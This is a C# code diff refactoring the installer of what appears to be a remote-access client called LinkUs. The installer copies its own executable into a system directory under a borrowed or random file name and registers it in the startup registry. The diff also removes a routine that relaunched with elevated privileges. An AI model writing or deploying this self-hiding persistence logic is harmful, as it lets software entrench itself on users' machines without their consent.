@@ -26,44 +26,27 @@ namespace LinkUs.Client.Install
         }
 
         // ----- Public methods
-        public InstallationStatus Install()
+        public string Install()
         {
-            try {
-                var currentInstalledApplicationPath = _registry.GetFileLocation();
-                if (string.IsNullOrEmpty(currentInstalledApplicationPath)) {
-                    ProcessInstall();
-                }
-                else if (string.Equals(currentInstalledApplicationPath, _environment.ApplicationPath, StringComparison.InvariantCultureIgnoreCase)) {
-                    CheckInstall();
-                }
-                else {
-                    var installedAssemblyInfo = AssemblyName.GetAssemblyName(currentInstalledApplicationPath);
-                    if (installedAssemblyInfo.Version >= Assembly.GetEntryAssembly().GetName().Version) {
-                        var fileName = Path.GetFileName(currentInstalledApplicationPath);
-                        var processes = Process.GetProcessesByName(fileName);
-                        if (processes.Length == 0) {
-                            Process.Start(new ProcessStartInfo(currentInstalledApplicationPath));
-                            // todo: missing case where the existing client is not well installed.
-                            // when restarted, it will try to checkinstall() and open uac! bad.
-                        }
-                        return InstallationStatus.Failed;
-                    }
-                    else {
-                        ProcessInstall();
-                    }
-                }
-                return InstallationStatus.Success;
+            var currentInstalledApplicationPath = _registry.GetFileLocation();
+            if (string.IsNullOrEmpty(currentInstalledApplicationPath)) {
+                return ProcessInstall();
             }
-            catch (UnauthorizedAccessException) {
-                var processStarted = _processManager.StartProcessWithElevatedPrivileges(_environment.ApplicationPath);
-                if (processStarted) {
-                    // We succeded to start a new process in admin mode
-                    // we can abort the installation.
-                    return InstallationStatus.Aborted;
+            else if (string.Equals(currentInstalledApplicationPath, _environment.ApplicationPath, StringComparison.InvariantCultureIgnoreCase)) {
+                CheckInstall();
+                return currentInstalledApplicationPath;
+            }
+            else {
+                var installedVersion = _fileService.GetAssemblyVersion(currentInstalledApplicationPath);
+                if (installedVersion >= _environment.CurrentVersion) {
+                    var fileName = Path.GetFileName(currentInstalledApplicationPath);
+                    if (_processManager.IsProcessStarted(fileName)) {
+                        return null;
+                    }
+                    return null;
                 }
                 else {
-                    // We failed to start the process in admin mode
-                    return InstallationStatus.Failed;
+                    return ProcessInstall();
                 }
             }
         }
@@ -72,18 +55,12 @@ namespace LinkUs.Client.Install
             _registry.RemoveFileFromStartupRegistry(_environment.ApplicationPath);
             _registry.ClearFileLocation();
         }
-
-        // ----- Internal logic
-        private void ProcessInstall()
+        public bool WellLocated()
         {
-            var fileName = _fileService.GetFileNameCopiedFromExisting(GetInstallationDirectory()) ?? _fileService.GetRandomFileName();
-            var targetFilePath = Path.Combine(GetInstallationDirectory(), fileName);
-
-            _fileService.Copy(_environment.ApplicationPath, targetFilePath);
-            _registry.AddFileToStartupRegistry(targetFilePath);
-            _registry.SetFileLocation(targetFilePath);
+            var parentDirectory = Path.GetDirectoryName(_environment.ApplicationPath);
+            return string.Equals(GetInstallationDirectory(), parentDirectory, StringComparison.CurrentCultureIgnoreCase);
         }
-        private void CheckInstall()
+        public void CheckInstall()
         {
             if (_registry.IsRegisteredAtStartup(_environment.ApplicationPath) == false) {
                 _registry.AddFileToStartupRegistry(_environment.ApplicationPath);
@@ -91,6 +68,19 @@ namespace LinkUs.Client.Install
             if (_registry.GetFileLocation() != _environment.ApplicationPath) {
                 _registry.SetFileLocation(_environment.ApplicationPath);
             }
+        }
+
+        // ----- Internal logic
+        private string ProcessInstall()
+        {
+            var fileName = _fileService.GetFileNameCopiedFromExisting(GetInstallationDirectory()) ?? _fileService.GetRandomFileName();
+            var targetFilePath = Path.Combine(GetInstallationDirectory(), fileName);
+
+            _fileService.Copy(_environment.ApplicationPath, targetFilePath);
+            _registry.AddFileToStartupRegistry(targetFilePath);
+            _registry.SetFileLocation(targetFilePath);
+
+            return targetFilePath;
         }
         private string GetInstallationDirectory()
         {
@@ -104,12 +94,5 @@ namespace LinkUs.Client.Install
                 return Environment.GetFolderPath(Environment.SpecialFolder.System);
             }
         }
-    }
-
-    public enum InstallationStatus
-    {
-        Failed,
-        Success,
-        Aborted
     }
 }
